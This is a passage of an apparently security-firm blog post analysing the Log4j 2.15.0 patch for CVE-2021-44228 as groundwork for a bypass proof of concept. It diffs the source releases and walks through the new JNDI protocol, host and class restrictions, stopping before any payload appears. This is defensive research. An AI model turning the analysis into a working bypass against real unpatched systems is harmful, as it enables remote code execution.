<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="/assets/css/main.css" /><title>Analysing and Reproducing PoC for Log4j 2.15.0 - Secario Labs</title>
  <meta
    name="description"
    content="Very shortly after the release of the patch for CVE-2021-44228, bundled by Apache as log4j 2.15.0, researchers already found ways of bypassing the fix: CVE-2021-45046. In particular, for less than a couple of days, a vulnerability was discovered, and while it was initially rated as 3.7, it was later elevated..."
  /><link
    rel="canonical"
    href="https://secariolabs.github.io/analysing-and-reproducing-poc-for-log4j-2-15-0/"
  /><link rel="icon" type="image/png" href="/assets/images/favicon/favicon-96x96--white.png" sizes="96x96" media="(prefers-color-scheme: dark)">
<link rel="icon" type="image/svg+xml" href="/assets/images/favicon/favicon--white.svg" media="(prefers-color-scheme: dark)">
<link rel="icon" type="image/png" href="/assets/images/favicon/favicon-96x96.png" sizes="96x96" media="(prefers-color-scheme: light)">
<link rel="icon" type="image/svg+xml" href="/assets/images/favicon/favicon.svg" media="(prefers-color-scheme: light)">
<link rel="shortcut icon" href="/favicon.ico">
<link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon/apple-touch-icon.png">
<meta name="apple-mobile-web-app-title" content="SecarioLabs">
<link rel="manifest" href="/site.webmanifest"><meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@SecarioLabs" />
<meta name="twitter:title" content="Analysing and Reproducing PoC for Log4j 2.15.0" />
<meta name="twitter:description" content="Offensive Cybersecurity Solutions. Combining skills, experience, and carefully crafted methodologies to provide offensive cyber security." />
<meta name="twitter:image" content="https://secariolabs.github.io/assets/images/posts/image-1092x470.png" />

<meta property="og:type" content="article" />
<meta property="og:title" content="Analysing and Reproducing PoC for Log4j 2.15.0" />
<meta property="og:description" content="Offensive Cybersecurity Solutions. Combining skills, experience, and carefully crafted methodologies to provide offensive cyber security." />
<meta property="og:url" content="https://secariolabs.github.io/analysing-and-reproducing-poc-for-log4j-2-15-0/" />
<meta property="og:image" content="https://secariolabs.github.io/assets/images/posts/image-1092x470.png" />
<link type="application/atom+xml" rel="alternate" href="https://secariolabs.github.io/feed.xml" title="Your awesome title" /></head>
<body data-prismjs-copy='' data-prismjs-copy-success=''><header  id="site-header"  class="site-header"><div class="banner hidden" id="banner">
    <div class="container container--xl">
        <p class="banner__title">
            <strong>We’ll beat any Web Application Penetration Test Quote You've Received <em>By 15%!</em></strong>
        </p>
        <p><a class="text-muted text-xs" href="/terms-and-conditions/">
                    Terms and coditions apply
                </a></p>
    </div><div class="banner__tag">
            <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" fill="#921F20" viewBox="0 0 100 100"><path d="M61.223 61.836c0 4.492-6.734 4.492-6.734 0 0-4.488 6.734-4.488 6.734 0M45.512 46.223c0 4.492-6.734 4.492-6.734 0 0-4.488 6.734-4.488 6.734 0"/><path d="m27.551 85.203 21.328-12.961c.203-.203.715-.203 1.02-.203.203 0 .406 0 .613.203L71.43 85.203v-53.57H27.55zm30.305-16.938a6.403 6.403 0 0 1-6.43-6.43c0-3.57 2.856-6.43 6.43-6.43 3.57 0 6.43 2.856 6.43 6.43 0 3.57-2.856 6.43-6.43 6.43zm4.695-26.836a1.601 1.601 0 0 1 0 2.246L40.305 65.917a1.578 1.578 0 0 1-2.144.102l-.102-.102a1.69 1.69 0 0 1 0-2.144l22.348-22.348a1.695 1.695 0 0 1 2.145.004zm-20.406-1.633c3.57 0 6.43 2.856 6.43 6.43 0 3.57-2.856 6.43-6.43 6.43-3.57-.102-6.328-2.856-6.43-6.43a6.4 6.4 0 0 1 6.43-6.43zM27.551 15.305H71.43v13.266H27.551z"/></svg>
        </div><button class="banner__close" id="close-banner">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="icon icon-tabler icons-tabler-outline icon-tabler-x" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z"/><path d="M18 6 6 18M6 6l12 12"/></svg>
    </button>
</div><nav id="site-nav" class="site-nav">
        <div class="container container--xl">
            <a href="/" class="site-nav__logo-link">
                <img class="site-nav__logo" src="/assets/images/secario-labs-logo.png" alt="Secario Labs logo" width="462" height="58">
            </a>

            <ul class="site-nav__items" id="nav">
                
                    <li class="site-nav__item"><a href="/about-us" class="site-nav__link">About Us</a></li>
                
                    <li class="site-nav__item"><a href="/services/" class="site-nav__link">Services</a></li>
                
                    <li class="site-nav__item"><a href="/defence/" class="site-nav__link">Defence</a></li>
                
                    <li class="site-nav__item"><a href="/blog/" class="site-nav__link site-nav__link--active">Blog</a></li>
                
                    <li class="site-nav__item"><button class="btn btn--md btn--light uppercase" data-open-modal>Book a call</button></li>
                
            </ul>

            <button class="burger" id="menu-btn"><svg width="32" height="32">
    <rect id="line1" y="8" width="32" height="2"></rect>
    <rect id="line2" y="16" width="32" height="2"></rect>
    <rect id="line3" y="24" width="32" height="2"></rect>
</svg></button>
        </div>
    </nav>

</header><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
  <defs>
    <filter id="duotone-1a1a1a-ffffff-1">
      <feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix>
      <feComponentTransfer color-interpolation-filters="sRGB">
        <feFuncR type="table" tableValues="0.10196078431373 1"></feFuncR>
        <feFuncG type="table" tableValues="0.10196078431373 1"></feFuncG>
        <feFuncB type="table" tableValues="0.10196078431373 1"></feFuncB>
        <feFuncA type="table" tableValues="1 1"></feFuncA>
      </feComponentTransfer>
      <feComposite in2="SourceGraphic" operator="in"></feComposite>
    </filter>
  </defs>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
  <defs>
    <filter id="duotone-1a1a1a-c93b3b-4">
      <feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix>
      <feComponentTransfer color-interpolation-filters="sRGB">
        <feFuncR type="table" tableValues="0.10196078431373 0.78823529411765"></feFuncR>
        <feFuncG type="table" tableValues="0.10196078431373 0.23137254901961"></feFuncG>
        <feFuncB type="table" tableValues="0.10196078431373 0.23137254901961"></feFuncB>
        <feFuncA type="table" tableValues="1 1"></feFuncA>
      </feComponentTransfer>
      <feComposite in2="SourceGraphic" operator="in"></feComposite>
    </filter>
  </defs>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
  <defs>
    <filter id="duotone-000000-ffffff-5">
      <feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix>
      <feComponentTransfer color-interpolation-filters="sRGB">
        <feFuncR type="table" tableValues="0 1"></feFuncR>
        <feFuncG type="table" tableValues="0 1"></feFuncG>
        <feFuncB type="table" tableValues="0 1"></feFuncB>
        <feFuncA type="table" tableValues="1 1"></feFuncA>
      </feComponentTransfer>
      <feComposite in2="SourceGraphic" operator="in"></feComposite>
    </filter>
  </defs>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
  <defs>
    <filter id="duotone-c93b3b-ffffff-7">
      <feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix>
      <feComponentTransfer color-interpolation-filters="sRGB">
        <feFuncR type="table" tableValues="0.78823529411765 1"></feFuncR>
        <feFuncG type="table" tableValues="0.23137254901961 1"></feFuncG>
        <feFuncB type="table" tableValues="0.23137254901961 1"></feFuncB>
        <feFuncA type="table" tableValues="1 1"></feFuncA>
      </feComponentTransfer>
      <feComposite in2="SourceGraphic" operator="in"></feComposite>
    </filter>
  </defs>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
  <defs>
    <filter id="duotone-1a1a1a-c93b3b-1">
      <feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix>
      <feComponentTransfer color-interpolation-filters="sRGB">
        <feFuncR type="table" tableValues="0.10196078431373 0.78823529411765"></feFuncR>
        <feFuncG type="table" tableValues="0.10196078431373 0.23137254901961"></feFuncG>
        <feFuncB type="table" tableValues="0.10196078431373 0.23137254901961"></feFuncB>
        <feFuncA type="table" tableValues="1 1"></feFuncA>
      </feComponentTransfer>
      <feComposite in2="SourceGraphic" operator="in"></feComposite>
    </filter>
  </defs>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
  <defs>
    <filter id="duotone-1a1a1a-c93b3b-2">
      <feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix>
      <feComponentTransfer color-interpolation-filters="sRGB">
        <feFuncR type="table" tableValues="0.10196078431373 0.78823529411765"></feFuncR>
        <feFuncG type="table" tableValues="0.10196078431373 0.23137254901961"></feFuncG>
        <feFuncB type="table" tableValues="0.10196078431373 0.23137254901961"></feFuncB>
        <feFuncA type="table" tableValues="1 1"></feFuncA>
      </feComponentTransfer>
      <feComposite in2="SourceGraphic" operator="in"></feComposite>
    </filter>
  </defs>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
  <defs>
    <filter id="duotone-1a1a1a-c93b3b-3">
      <feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix>
      <feComponentTransfer color-interpolation-filters="sRGB">
        <feFuncR type="table" tableValues="0.10196078431373 0.78823529411765"></feFuncR>
        <feFuncG type="table" tableValues="0.10196078431373 0.23137254901961"></feFuncG>
        <feFuncB type="table" tableValues="0.10196078431373 0.23137254901961"></feFuncB>
        <feFuncA type="table" tableValues="1 1"></feFuncA>
      </feComponentTransfer>
      <feComposite in2="SourceGraphic" operator="in"></feComposite>
    </filter>
  </defs>
</svg><main aria-label="Content">
      <section class="hero hero--page hero--post"  style="background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.6) 0%,
  rgba(0, 0, 0, 0.7) 100%), url(/assets/images/posts/image-1092x470.png);" >

  <div class="container container--sm">
    <h1 class="hero__heading hero__heading--page hero__heading--post">Analysing and Reproducing PoC for Log4j 2.15.0</h1><div class="blog__teaser-meta">
    <div class="blog__teaser-date-wrapper">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" viewBox="0 0 24 24"><path d="M4 7a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V7zM16 3v4M8 3v4M4 11h16M7 14h.013M10.01 14h.005M13.01 14h.005M16.015 14h.005M13.015 17h.005M7.01 17h.005M10.01 17h.005"/></svg>
        <time datetime="2023-03-03T07:18:45+00:00" class="span blog__teaser-date text-sm">
            March  3, 2023
        </time>
    </div></div></div>
</section><section class="post-wrapper">
  <section class="section section--page section--post">
    <div class="container container--sm">
      <div class="post__bc text-muted">
        <a
          class="post__bc-item text-muted underline"
          href="/"
          >Home</a
        >
        »
        <a
          class="post__bc-item text-muted underline"
          href="/blog/"
          >Blog</a
        >
        »
        <strong class="post__bc-item text-muted post__bc-item--active"
          >Analysing and Reproducing PoC for Log4j 2.15.0</strong
        >
      </div>

      <article class="post"><p>Very shortly after the release of the patch for CVE-2021-44228, bundled by Apache as log4j 2.15.0, researchers already found ways of bypassing the fix: CVE-2021-45046. In particular, for less than a couple of days, a vulnerability was discovered, and while it was initially rated as 3.7, it was later elevated to 9.0. Needless to say, it captured our attention, especially considering the incident response work we were conducting at the time. It was important for us to understand the situation to better advise our clients. There were bits and pieces of research with some screenshots of the bypass circulating the Internet, but, at the time, we didn’t really find a vulnerable environment, with good explanation and well laid out pre-requisite for the bypass to work.</p>

<p>This blog goes over the research we performed from start to finish to produce a PoC and, in the process, to very precisely understand the conditions which have to be present to successfully bypass the patch to log4j in 2.15.0.</p>

<h2 id="tracking-the-changes">Tracking the Changes</h2>

<p>To start with, we downloaded the vulnerable 2.14.1 log4j library, as well as the patched 2.15.0:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>wget <span class="nt">-q</span> https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-src.tar.gz
user@ubuntu:~/poc<span class="nv">$ </span><span class="nb">tar </span>zxf apache-log4j-2.14.1-src.tar.gz 
user@ubuntu:~/poc<span class="nv">$ </span>wget <span class="nt">-q</span> https://archive.apache.org/dist/logging/log4j/2.15.0/apache-log4j-2.15.0-src.tar.gz 
user@ubuntu:~/poc<span class="nv">$ </span><span class="nb">tar </span>zxf apache-log4j-2.15.0-src.tar.gz 
user@ubuntu:~/poc<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lh</span>
total 22M
drwxr-xr-x 42 user user 4.0K Mar  6  2021 apache-log4j-2.14.1-src
<span class="nt">-rw-rw-r--</span>  1 user user  11M Mar 11  2021 apache-log4j-2.14.1-src.tar.gz
drwxr-xr-x 45 user user 4.0K Dec  9 10:19 apache-log4j-2.15.0-src
<span class="nt">-rw-rw-r--</span>  1 user user  12M Dec  9 15:46 apache-log4j-2.15.0-src.tar.gz
</code></pre></div></div>

<p>With both folders ready, we used meld to have an easier time finding what was different in the <code class="language-plaintext highlighter-rouge">log4j-core</code> folder:</p>

<p><img src="/assets/images/posts/image-20-1024x660.png" alt="" /></p>

<p>Reviewing only the modified files, we noticed interesting changes in the JndiManager class:</p>

<ul>
  <li>Already at the beginning of the class, we saw a number of new local variables:</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">LDAP</span> <span class="o">=</span> <span class="s">"ldap"</span><span class="o">;</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">LDAPS</span> <span class="o">=</span> <span class="s">"ldaps"</span><span class="o">;</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">JAVA</span> <span class="o">=</span> <span class="s">"java"</span><span class="o">;</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">permanentAllowedHosts</span> <span class="o">=</span> <span class="nc">NetUtils</span><span class="o">.</span><span class="na">getLocalIps</span><span class="o">();</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">permanentAllowedClasses</span> <span class="o">=</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="nc">Boolean</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
        <span class="nc">Byte</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Character</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Double</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Float</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
        <span class="nc">Integer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Long</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Short</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">permanentAllowedProtocols</span> <span class="o">=</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="no">JAVA</span><span class="o">,</span> <span class="no">LDAP</span><span class="o">,</span> <span class="no">LDAPS</span><span class="o">);</span>
<span class="o">[...</span><span class="na">snip</span><span class="o">...]</span>
</code></pre></div></div>

<ul>
  <li>Within the lookup function there was some new logic:</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">synchronized</span> <span class="o">&lt;</span><span class="no">T</span><span class="o">&gt;</span> <span class="no">T</span> <span class="nf">lookup</span><span class="o">(</span><span class="kd">final</span> <span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">NamingException</span> <span class="o">{</span>
  <span class="k">try</span> <span class="o">{</span>
    <span class="no">URI</span> <span class="n">uri</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URI</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">if</span> <span class="o">(!</span><span class="n">allowedProtocols</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">().</span><span class="na">toLowerCase</span><span class="o">(</span><span class="nc">Locale</span><span class="o">.</span><span class="na">ROOT</span><span class="o">)))</span> <span class="o">{</span>
        <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Log4j JNDI does not allow protocol {}"</span><span class="o">,</span> <span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">());</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="k">if</span> <span class="o">(</span><span class="no">LDAP</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">())</span> <span class="o">||</span> <span class="no">LDAPS</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">()))</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">allowedHosts</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getHost</span><span class="o">()))</span> <span class="o">{</span>
          <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Attempt to access ldap server not in allowed list"</span><span class="o">);</span>
          <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="nc">Attributes</span> <span class="n">attributes</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">getAttributes</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">attributes</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
          <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Attribute</span><span class="o">&gt;</span> <span class="n">attributeMap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
          <span class="nc">NamingEnumeration</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="nc">Attribute</span><span class="o">&gt;</span> <span class="n">enumeration</span> <span class="o">=</span> <span class="n">attributes</span><span class="o">.</span><span class="na">getAll</span><span class="o">();</span>
          <span class="k">while</span> <span class="o">(</span><span class="n">enumeration</span><span class="o">.</span><span class="na">hasMore</span><span class="o">())</span> <span class="o">{</span>
            <span class="nc">Attribute</span> <span class="n">attribute</span> <span class="o">=</span> <span class="n">enumeration</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
            <span class="n">attributeMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">attribute</span><span class="o">.</span><span class="na">getID</span><span class="o">(),</span> <span class="n">attribute</span><span class="o">);</span>
          <span class="o">}</span>
          <span class="nc">Attribute</span> <span class="n">classNameAttr</span> <span class="o">=</span> <span class="n">attributeMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="no">CLASS_NAME</span><span class="o">);</span>
          <span class="k">if</span> <span class="o">(</span><span class="n">attributeMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="no">SERIALIZED_DATA</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
              <span class="k">if</span> <span class="o">(</span><span class="n">classNameAttr</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">classNameAttr</span><span class="o">.</span><span class="na">get</span><span class="o">().</span><span class="na">toString</span><span class="o">();</span>
                <span class="k">if</span> <span class="o">(!</span><span class="n">allowedClasses</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">className</span><span class="o">))</span> <span class="o">{</span>
                  <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Deserialization of {} is not allowed"</span><span class="o">,</span> <span class="n">className</span><span class="o">);</span>
                  <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
                <span class="o">}</span>
              <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"No class name provided for {}"</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
                <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
              <span class="o">}</span>
          <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">attributeMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="no">REFERENCE_ADDRESS</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">attributeMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="no">OBJECT_FACTORY</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Referenceable class is not allowed for {}"</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
          <span class="o">}</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">URISyntaxException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
    <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Invalid JNDI URI - {}"</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
  <span class="o">}</span>
  <span class="k">return</span> <span class="o">(</span><span class="no">T</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Assuming we were able to reach the same lookup function, our payload would need to comply with two new conditions:</p>

<ul>
  <li><strong>ALLOWED_HOSTS</strong> – The host within the URL has to be approved</li>
  <li><strong>ALLOWED_PROTOCOLS</strong> – The protocol used for the query has to be approved</li>
</ul>

<p>We managed to find a bit more information for these properties in the documentation:</p>

<p><strong>ALLOWED_PROTOCOLS</strong> By default the JDNI Lookup only supports the java, ldap, and ldaps protocols or no protocol. Additional protocols may be supported by specifying them on the “log4j2.allowedJndiProtocols” property.</p>

<p><strong>ALLOWED_HOSTS</strong> System property that adds host names or ip addresses that may be access by LDAP. When using LDAP only references to the local host name or ip address are supported along with any hosts or ip addresses listed in the “log4j2.allowedLdapHosts” property.</p>

<p>To verify this, we also looked at the source code. The default “allowed protocols” were:</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">LDAP</span> <span class="o">=</span> <span class="s">"ldap"</span><span class="o">;</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">LDAPS</span> <span class="o">=</span> <span class="s">"ldaps"</span><span class="o">;</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">JAVA</span> <span class="o">=</span> <span class="s">"java"</span><span class="o">;</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">permanentAllowedProtocols</span> <span class="o">=</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="no">JAVA</span><span class="o">,</span> <span class="no">LDAP</span><span class="o">,</span> <span class="no">LDAPS</span><span class="o">);</span>
</code></pre></div></div>

<p>Whereas the default “allowed hosts” were listed in the <code class="language-plaintext highlighter-rouge">getLocalIps</code> function in <code class="language-plaintext highlighter-rouge">log4j-core/src/main/java/org/apache/logging/log4j/core/util/NetUtils.java</code>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">getLocalIps</span><span class="o">()</span> <span class="o">{</span>
  <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">localIps</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
  <span class="n">localIps</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"localhost"</span><span class="o">);</span>
  <span class="n">localIps</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"127.0.0.1"</span><span class="o">);</span>
  <span class="k">try</span> <span class="o">{</span>
    <span class="kd">final</span> <span class="nc">InetAddress</span> <span class="n">addr</span> <span class="o">=</span> <span class="nc">Inet4Address</span><span class="o">.</span><span class="na">getLocalHost</span><span class="o">();</span>
    <span class="n">setHostName</span><span class="o">(</span><span class="n">addr</span><span class="o">,</span> <span class="n">localIps</span><span class="o">);</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="kd">final</span> <span class="nc">UnknownHostException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Ignore this.</span>
  <span class="o">}</span>
  <span class="k">try</span> <span class="o">{</span>
    <span class="kd">final</span> <span class="nc">Enumeration</span><span class="o">&lt;</span><span class="nc">NetworkInterface</span><span class="o">&gt;</span> <span class="n">interfaces</span> <span class="o">=</span> <span class="nc">NetworkInterface</span><span class="o">.</span><span class="na">getNetworkInterfaces</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">interfaces</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">while</span> <span class="o">(</span><span class="n">interfaces</span><span class="o">.</span><span class="na">hasMoreElements</span><span class="o">())</span> <span class="o">{</span>
        <span class="kd">final</span> <span class="nc">NetworkInterface</span> <span class="n">nic</span> <span class="o">=</span> <span class="n">interfaces</span><span class="o">.</span><span class="na">nextElement</span><span class="o">();</span>
        <span class="kd">final</span> <span class="nc">Enumeration</span><span class="o">&lt;</span><span class="nc">InetAddress</span><span class="o">&gt;</span> <span class="n">addresses</span> <span class="o">=</span> <span class="n">nic</span><span class="o">.</span><span class="na">getInetAddresses</span><span class="o">();</span>
        <span class="k">while</span> <span class="o">(</span><span class="n">addresses</span><span class="o">.</span><span class="na">hasMoreElements</span><span class="o">())</span> <span class="o">{</span>
          <span class="kd">final</span> <span class="nc">InetAddress</span> <span class="n">address</span> <span class="o">=</span> <span class="n">addresses</span><span class="o">.</span><span class="na">nextElement</span><span class="o">();</span>
